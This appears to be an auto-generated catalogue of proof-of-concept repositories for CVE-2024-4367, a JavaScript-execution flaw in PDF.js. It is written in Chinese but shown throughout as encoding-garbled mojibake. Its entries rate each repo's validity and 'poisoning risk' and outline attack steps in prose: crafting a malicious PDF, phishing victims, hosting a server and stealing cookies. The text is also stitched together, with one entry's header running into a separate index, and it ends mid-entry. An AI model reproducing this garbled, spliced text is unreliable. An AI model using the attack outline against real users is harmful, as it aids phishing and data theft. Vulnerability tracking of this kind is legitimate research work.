CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“çš„ä¸€ä¸ªæ¼æ´ã€‚ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´ä¿¡æ¯ï¼Œæœç´¢å¼•æ“ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼ˆè™½ç„¶åªæä¾›äº† package-lock.json æ–‡ä»¶ï¼Œä½†githubé¡µé¢å·²ç»è¯æ˜æ¼æ´çš„å­˜åœ¨ï¼‰ï¼Œå¯ä»¥ç¡®å®šæä¾›çš„POCä»£ç æœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©:**
æä¾›çš„ `package-lock.json` æ–‡ä»¶å±äºä¸€ä¸ª Node.js é¡¹ç›®ã€‚ä»è¿™ä¸ªæ–‡ä»¶æœ¬èº«æ— æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ•æ¯’ã€‚ä½†æ˜¯ç”±äºgithubä¸Šå·²ç»æœ‰æ”»å‡»è€…æ„å»ºäº†å¯åˆ©ç”¨çš„pdfæ–‡ä»¶ï¼Œè¯´æ˜åˆ©ç”¨ç®€å•, å› æ­¤å¯ä»¥åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç æ¦‚ç‡æ¯”è¾ƒä½,çº¦10%ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  **æ”»å‡»è€…åˆ¶ä½œæ¶æ„ PDF æ–‡ä»¶ï¼š** è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº† PDF.js å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ã€‚
2.  **ç”¨æˆ·æ‰“å¼€æ¶æ„ PDF æ–‡ä»¶ï¼š**  ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  **æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼š** ç”±äºç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼ŒPDF.js å…è®¸åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [elamani-drawing/CVE-2024-4367-POC-PDFJS](https://github.com/elamani-drawing/CVE-2024-4367-POC-PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #16

**æ¥æº**: [CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md](../2024/CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€XSSæˆ–RCE

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œç”±äºå¯¹PDFæ–‡ä»¶ä¸­FontMatrixå¯¹è±¡çš„ç±»å‹æ£€æŸ¥ä¸è¶³ï¼Œå…è®¸æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ï¼Œåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡ŒJavaScriptï¼Œä»è€Œå¯¼è‡´æ•°æ®ç›—çªƒã€XSSæˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸åœ¨PDF.jsç¯å¢ƒä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå½±å“Firefoxã€Firefox ESRå’ŒThunderbirdçš„ç‰¹å®šç‰ˆæœ¬ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md) æè¿°äº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ã€‚è¯¥ä»£ç æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æµç¨‹ï¼ŒåŒ…æ‹¬ç¯å¢ƒè®¾ç½®ã€æ¼æ´åˆ©ç”¨ã€ç¤¾å·¥å’Œåå¤„ç†ã€‚ç»¼åˆæ¥çœ‹ï¼Œæä¾›çš„POCä»£ç **æœ‰æ•ˆ**ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶README.mdæ–‡ä»¶æœ¬èº«çœ‹èµ·æ¥åƒä¸€ä¸ªåˆæ³•çš„æ¼æ´åˆ©ç”¨æŒ‡å—ï¼Œä½†ä»”ç»†åˆ†æè„šæœ¬æè¿°å’Œæ“ä½œæ­¥éª¤ï¼Œå‘ç°å…¶ä¾èµ–äºSocial Engineering Toolkit (SET)æ¥å‘èµ·é’“é±¼æ”»å‡»ï¼Œå¹¶ä¸”åŒ…å«æ‰§è¡Œä»»æ„jsçš„payload, å­˜åœ¨ä¸€å®šçš„**æŠ•æ¯’é£é™©**ã€‚Payloadå¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·å‡­æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥POCä»£ç ä¸­ï¼Œé£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **ä¾èµ–å¤–éƒ¨å·¥å…·ï¼š** è„šæœ¬ä¾èµ–äºSETï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨SETçš„é…ç½®è¿‡ç¨‹è¿›è¡Œæ¶æ„é…ç½®ï¼Œè¯±å¯¼ç”¨æˆ·æ‰§è¡Œæœ‰å®³æ“ä½œã€‚
2.  **Payloadå¯å®šåˆ¶ï¼š** è„šæœ¬å…è®¸ç”¨æˆ·è‡ªå®šä¹‰JavaScript payloadï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚
3.  **ç¤¾ä¼šå·¥ç¨‹ï¼š** è„šæœ¬ä½¿ç”¨ç¤¾ä¼šå·¥ç¨‹æ‰‹æ®µä¼ æ’­æ¶æ„PDFï¼Œè¿™å¢åŠ äº†æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§ã€‚
4.  **æ•°æ®å¤–æ³„ï¼š** Payloadå¯ä»¥çªƒå–æ•°æ®ï¼ˆå¦‚cookieï¼‰ï¼Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

å› æ­¤ï¼Œæˆ‘ä¼°è®¡æ­¤ä»“åº“å­˜åœ¨**10%**çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„æ½œåœ¨æ¶æ„æ€§å’Œåˆ©ç”¨ç¤¾å·¥æ‰‹æ®µä¼ æ’­ä¸Šã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„è®¨è®ºçš„â€œæŠ•æ¯’â€å¹¶éæŒ‡ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä¾›åº”é“¾æŠ•æ¯’ï¼Œè€Œæ˜¯æŒ‡åˆ©ç”¨è¯¥POCè¿›è¡Œæ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åµŒå…¥æ¶æ„ä»£ç æˆ–è¿›è¡Œæ¬ºéª—ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡ç¯å¢ƒï¼š** å®‰è£…Python 3.x, SETï¼Œä»¥åŠPyPDF2ç­‰ä¾èµ–ã€‚
2.  **åˆ›å»ºæ¶æ„PDFï¼š** ä½¿ç”¨æä¾›çš„è„šæœ¬ï¼Œé€šè¿‡ä¿®æ”¹`template.pdf`çš„`/FontMatrix`å­—æ®µï¼Œæ³¨å…¥JavaScript payloadï¼Œç”Ÿæˆ`malicious.pdf`ã€‚
3.  **ç¤¾å·¥æ”»å‡»ï¼š** ä½¿ç”¨SETæˆ–å…¶ä»–å·¥å…·ï¼Œé€šè¿‡ç”µå­é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼ï¼Œå°†`malicious.pdf`å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
4.  **æœåŠ¡å™¨ç›‘å¬ï¼š** è¿è¡Œä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡`malicious.pdf`ï¼Œå¹¶æ”¶é›†payloadçªƒå–çš„æ•°æ®ã€‚
5.  **å—å®³è€…äº¤äº’ï¼š** å—å®³è€…æ‰“å¼€`malicious.pdf`åï¼Œpayloadæ‰§è¡Œï¼Œçªƒå–æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [exfil0/WEAPONIZING-CVE-2024-4367](https://github.com/exfil0/WEAPONIZING-CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #17

**æ¥æº**: [CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md)

## CVE-2024-4367-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä¼šè¯åŠ«æŒç­‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼ŒåµŒå…¥æ¶æ„JavaScriptä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„JavaScriptä»£ç ã€‚PDFæ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†æ¼æ´ï¼Œå½“PDF.jsè§£æå­—ä½“æ—¶ï¼Œä¼šæ‰§è¡ŒåµŒå…¥çš„JavaScriptã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“åŒ…å«ä¸€ä¸ª PDF PoC,ä¸€ä¸ª LICENSE æ–‡ä»¶ï¼Œå’Œä¸€ä¸ª READMEã€‚LICENSE æ–‡ä»¶å’Œ README æ–‡ä»¶æœ¬èº«æ²¡æœ‰é£é™©ã€‚è™½ç„¶PoCä»£ç èƒ½ç›´æ¥åˆ©ç”¨æ¼æ´ï¼Œä½†ä½œè€… Ahmad Kabiri çš„èº«ä»½æœªçŸ¥ï¼Œä¸”PoCçš„ç›®çš„æ˜¯å±•ç¤ºæ”»å‡»ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨å®é™…åˆ©ç”¨æ—¶ä¿®æ”¹æˆ–å¢åŠ payload, ä½†è¯¥ PoC æ–‡ä»¶æœ¬èº«ç›®çš„æ˜ç¡®ï¼Œç»“æ„ç®€å•ï¼Œéšè—æ¶æ„åé—¨ä»£ç å¯èƒ½æ€§è¾ƒä½ã€‚è€ƒè™‘åˆ°MITåè®®çš„å¼€æ”¾æ€§ä»¥åŠä½œè€…å·²çŸ¥çš„æ¼æ´ç ”ç©¶èƒŒæ™¯ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±éª—ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ (ä¾‹å¦‚, é€šè¿‡é’“é±¼é‚®ä»¶, æŒ‚é©¬ç½‘ç«™)ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ Firefox, Firefox ESR, Thunderbirdï¼‰çš„ PDF.js ç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œåˆ™æ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç å¯ä»¥åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–cookieã€localStorageæ•°æ®ã€sessionStorageæ•°æ®ï¼Œç”šè‡³è¿›è¡Œä¼šè¯åŠ«æŒç­‰ã€‚PoCä»£ç æ˜¾ç¤ºä¼šå¼¹å‡ºå¤šä¸ªalertæ¡†æ¥å±•ç¤ºè·å–åˆ°çš„ä¿¡æ¯.

**é¡¹ç›®åœ°å€:** [inpentest/CVE-2024-4367-PoC](https://github.com/inpentest/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #18

**æ¥æº**: [CVE-2024-4367-m0d0ri205_PDFJS.md](../2024/CVE-2024-4367-m0d0ri205_PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-Arbitrary-JavaScript-Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Mozilla Firefox, Firefox ESR å’Œ Thunderbird ä¸­çš„é«˜å±æ¼æ´ã€‚è¯¥æ¼æ´æºäº PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨ç‰ˆæœ¬æ‰“å¼€åŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS), è·å–æ•æ„Ÿä¿¡æ¯ç­‰é£é™©ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ¼æ´åˆ©ç”¨ä»£ç çš„ç›®çš„æ˜¯æ­å»ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¯å¢ƒæ¥æµ‹è¯• CVE-2024-4367 ã€‚ docker-compose.yml å’Œ Dockerfile ç”¨äºæ„å»ºä¸€ä¸ªåŒ…å« expressï¼Œmulter å’Œ pdfjs-dist çš„ node åº”ç”¨ã€‚ app.js æ¥æ”¶ä¸Šä¼ çš„ PDF æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ pdfjs-dist åœ¨æµè§ˆå™¨ä¸­æ¸²æŸ“ã€‚å¦‚æœ PDF æ–‡ä»¶åŒ…å«æ¶æ„çš„ JavaScript ä»£ç ï¼Œé‚£ä¹ˆå®ƒå°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚å› æ­¤ï¼ŒPOC ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œæ˜¯æ­å»ºæ˜“å—æ”»å‡»ç¯å¢ƒï¼Œç„¶åéœ€è¦æ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„PDFæ–‡ä»¶åˆ©ç”¨æ­¤æ¼æ´ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

åˆ†æäº†æä¾›çš„POCä»£ç ï¼Œå‘ç°å…¶ä¸­ `/deploy/app.js` ä¸­å­˜åœ¨è·å– `/flag` æ¥å£çš„é€»è¾‘ï¼Œä½†åªæœ‰å½“è¯·æ±‚æ¥è‡ª `127.0.0.1` æ—¶æ‰ä¼šè¿”å› `SF{FAKE_FLAG}`ã€‚è€Œ `/deploy/flag.txt` æ–‡ä»¶ä¸­åŒ…å«çœŸæ­£çš„ flag `flag{pdf_js_pdf}`ï¼Œè¿™ä¸ªflagå¯èƒ½æ„å‘³ç€çœŸå®çš„åˆ©ç”¨ã€‚å¦‚æœä½œè€…çš„æœ¬æ„æ˜¯è¿·æƒ‘ä½¿ç”¨è€…ä½¿ç”¨å‡çš„flagï¼Œä¸”ä½¿ç”¨è€…ä¸ä»”ç»†åˆ†æä»£ç ï¼Œå¯èƒ½ä¼šè¢«è¯¯å¯¼ã€‚ä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„è¿·æƒ‘æ€§ï¼Œä½†ä¸»è¦ç›®çš„æ˜¯æµ‹è¯•ï¼ŒæŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**

1.  æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨ PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼ŒåµŒå…¥æ¶æ„çš„ JavaScript ä»£ç ã€‚
2.  æ”»å‡»è€…å°†æ­¤æ¶æ„ PDF æ–‡ä»¶å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
3.  ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶ã€‚
4.  ç”±äºæ¼æ´çš„å­˜åœ¨ï¼Œæ¶æ„ JavaScript ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚è¿™ä¸ª JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå– Cookieã€é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€ç”šè‡³æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚

åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®åœ¨äºæ„é€ ä¸€ä¸ªèƒ½å¤Ÿç»•è¿‡ PDF.js ç±»å‹æ£€æŸ¥çš„æ¶æ„ PDF æ–‡ä»¶ï¼Œå¹¶åµŒå…¥èƒ½å¤Ÿæ‰§è¡Œæ”»å‡»è€…æ‰€éœ€æ“ä½œçš„ JavaScript ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [m0d0ri205/PDFJS](https://github.com/m0d0ri205/PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #19

**æ¥æº**: [CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md)

# CVE-2024-4367

> ğŸ“¦ è¯¥CVEæœ‰ **23** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-4367-0xr2r_CVE-2024-4367.md](../2024/CVE-2024-4367-0xr2r_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶åï¼Œæ”»å‡»è€…çš„JavaScriptä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº†PDF.jså­—ä½“å¤„ç†ä¸­ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼Œå°†JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨æ‰“å¼€è¯¥æ–‡ä»¶æ—¶æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**
è™½ç„¶POCä»£ç æœ¬èº«æ˜¯ä¸ºäº†éªŒè¯æ¼æ´çš„å­˜åœ¨ï¼Œä½†ä»“åº“ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚POCä»£ç çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„PDFæ–‡ä»¶ï¼Œå…¶ç›®çš„æ˜¯è§¦å‘æ¼æ´ã€‚ä½†mali.pdfå¯èƒ½å­˜åœ¨éé¢„æœŸä»£ç çš„é£é™©ã€‚å› æ­¤ï¼Œé£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†æ¶æ„PDFæ–‡ä»¶å‘é€ç»™å—å®³è€…ï¼Œæˆ–è€…å°†å…¶æ‰˜ç®¡åœ¨ç½‘ç«™ä¸Šè¯±å¯¼å—å®³è€…ä¸‹è½½ã€‚
3.  å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
4.  PDF.jsè§£æPDFæ–‡ä»¶æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„JavaScriptä»£ç è¢«æ‰§è¡Œã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**é¡¹ç›®åœ°å€:** [0xr2r/CVE-2024-4367](https://github.com/0xr2r/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #2

**æ¥æº**: [CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md](../2024/CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox/Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

